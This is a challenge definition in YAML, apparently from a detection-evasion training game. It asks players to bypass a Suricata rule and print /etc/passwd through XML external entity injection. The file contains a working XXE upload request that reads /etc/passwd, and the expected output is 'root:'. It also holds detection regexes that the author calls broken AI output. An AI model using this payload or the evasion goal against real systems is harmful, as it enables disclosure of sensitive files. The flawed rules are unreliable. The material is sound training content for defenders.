@@ -1,0 +1,87 @@
+name: 'XML eXternal Entities (XXE) 3'
+type: 'exploit'
+
+text: |-
+  Time to bypass the rule(s) below! You're on your own now, but feel free to
+  ask questions!
+
+  I wrote this Suricata rule with the following prompt:
+
+  ```
+  Can you write a Suricata rule that will detect the following XXE-based vulnerability?
+
+  POST / HTTP/1.1
+  Host: localhost
+  Connection: keep-alive
+  Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybBYvkB2ohiOQdWxB
+
+  ------WebKitFormBoundarybBYvkB2ohiOQdWxB
+  Content-Disposition: form-data; name="dragon_file"; filename="dragons.xml"
+  Content-Type: text/xml
+
+  <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE draconis [
+       <!ENTITY xxe SYSTEM "file:///etc/passwd">
+     ]>
+     <dragons>
+       <dragon>
+         <name>Smaug</name>
+         <proof>&xxe;</proof>
+       </dragon>
+     </dragons>
+
+  ------WebKitFormBoundarybBYvkB2ohiOQdWxB--
+  ```
+
+  But it generated this regular expression, which didn't work: `pcre:"/<!DOCTYPE\s+[^\[]*?ENTITY\s+\S+\s+SYSTEM\s*[\"']file:\/\//is";`
+
+  So I figured out where the problem is and asked it again:
+
+  ```
+  This part of the regular expression isn't matching the traffic correctly: "\s+[^\[]*?"
+  ```
+
+  But it generated a more complex but also broken regex:
+
+  ```
+  pcre:"/(?i)<!DOCTYPE\s+[^\\[]*?ENTITY\s+\S+\s+SYSTEM\s*[\"']file:\/\//s";
+  ```
+
+  So I gave up and used the first regex, but fixed it by hand to at least catch the test case!
+
+  **Goal: Print /etc/passwd**
+
+hints: []
+
+target: evidence
+
+base_request: |-
+  POST / HTTP/1.1
+  Host: localhost
+  Connection: keep-alive
+  Content-Length: auto
+  Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybBYvkB2ohiOQdWxB
+
+  ------WebKitFormBoundarybBYvkB2ohiOQdWxB
+  Content-Disposition: form-data; name="dragon_file"; filename="dragons.xml"
+  Content-Type: text/xml
+
+  <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE draconis [
+       <!ENTITY xxe SYSTEM "file:///etc/passwd">
+     ]>
+     <dragons>
+       <dragon>
+         <name>Smaug</name>
+         <proof>&xxe;</proof>
+       </dragon>
+     </dragons>
+
+  ------WebKitFormBoundarybBYvkB2ohiOQdWxB--
+
+rules:
+# AI-generated - several issues
+- >
+  alert http any any -> any any ( msg:"XXE Injection via XML Upload (CVE-2024-XXXX-like)"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/"; http.header; content:"multipart/form-data"; nocase; file_data; content:"<!DOCTYPE"; fast_pattern; pcre:"/<!DOCTYPE\s+[^\[]*\[[^\[]*ENTITY\s+\S+\s+SYSTEM\s*[\"']file:\/\//is"; classtype:web-application-attack; sid:1000009; rev:1;)
+
+expected_output: "root:"
